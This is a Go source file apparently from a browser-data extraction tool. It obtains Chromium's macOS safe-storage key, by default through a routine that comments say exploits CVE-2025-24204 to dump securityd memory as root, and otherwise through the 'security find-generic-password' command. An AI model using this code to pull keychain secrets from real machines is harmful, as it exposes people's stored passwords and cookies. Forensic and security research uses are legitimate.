//go:build darwin

package keyretriever

import (
	"bytes"
	"context"
	"crypto/sha1"
	"fmt"
	"os/exec"
	"strings"
	"time"
)

// https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_mac.mm;l=157
var darwinParams = pbkdf2Params{
	salt:       []byte("saltysalt"),
	iterations: 1003,
	keyLen:     16,
	hashFunc:   sha1.New,
}

// securityCmdTimeout is the maximum time to wait for the security command.
const securityCmdTimeout = 30 * time.Second

// GcoredumpRetriever uses CVE-2025-24204 to extract keychain secrets
// by dumping the securityd process memory. Requires root privileges.
type GcoredumpRetriever struct{}

func (r *GcoredumpRetriever) RetrieveKey(storage, _ string) ([]byte, error) {
	secret, err := DecryptKeychain(storage)
	if err != nil {
		return nil, fmt.Errorf("gcoredump: %w", err)
	}
	if secret == "" {
		return nil, fmt.Errorf("gcoredump: empty secret for %s", storage)
	}
	return darwinParams.deriveKey([]byte(secret)), nil
}

// SecurityCmdRetriever uses macOS `security` CLI to query Keychain.
// This may trigger a password dialog on macOS.
type SecurityCmdRetriever struct{}

func (r *SecurityCmdRetriever) RetrieveKey(storage, _ string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), securityCmdTimeout)
	defer cancel()

	var stdout, stderr bytes.Buffer
	cmd := exec.CommandContext(ctx, "security", "find-generic-password", "-wa", strings.TrimSpace(storage)) //nolint:gosec
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return nil, fmt.Errorf("security command timed out after %s", securityCmdTimeout)
		}
		return nil, fmt.Errorf("security command: %w (%s)", err, strings.TrimSpace(stderr.String()))
	}
	if stderr.Len() > 0 {
		return nil, fmt.Errorf("keychain: %s", strings.TrimSpace(stderr.String()))
	}

	secret := bytes.TrimSpace(stdout.Bytes())
	if len(secret) == 0 {
		return nil, fmt.Errorf("keychain: empty secret for %s", storage)
	}

	return darwinParams.deriveKey(secret), nil
}

// DefaultRetriever returns the macOS retriever chain:
// gcoredump (CVE-2025-24204) first, then security command fallback.
func DefaultRetriever() KeyRetriever {
	return NewChain(
		&GcoredumpRetriever{},
		&SecurityCmdRetriever{},
	)
}
